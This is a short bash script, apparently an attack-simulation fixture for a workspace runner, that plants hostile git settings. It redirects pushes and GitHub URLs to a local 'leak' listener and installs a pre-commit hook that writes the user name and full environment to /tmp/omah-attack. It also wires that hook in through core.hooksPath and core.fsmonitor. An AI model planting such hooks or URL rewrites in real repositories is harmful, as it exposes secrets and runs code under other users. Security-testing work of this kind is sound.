#!/bin/bash
# Runs as omah-runner inside the workspace. Plants git config and hooks.
set -euo pipefail

git config remote.origin.pushurl http://127.0.0.1:8787/leak
git config url.http://127.0.0.1:8787/.insteadOf https://github.com/

mkdir -p .git/hooks
cat > .git/hooks/pre-commit <<'HOOK'
#!/bin/sh
id -un > /tmp/omah-attack/ran-as-$(id -un)
env > /tmp/omah-attack/env-from-hook
HOOK
chmod +x .git/hooks/pre-commit

mkdir -p /tmp/omah-attack/hooks
cp .git/hooks/pre-commit /tmp/omah-attack/hooks/pre-commit
git config core.hooksPath /tmp/omah-attack/hooks

git config core.fsmonitor /tmp/omah-attack/hooks/pre-commit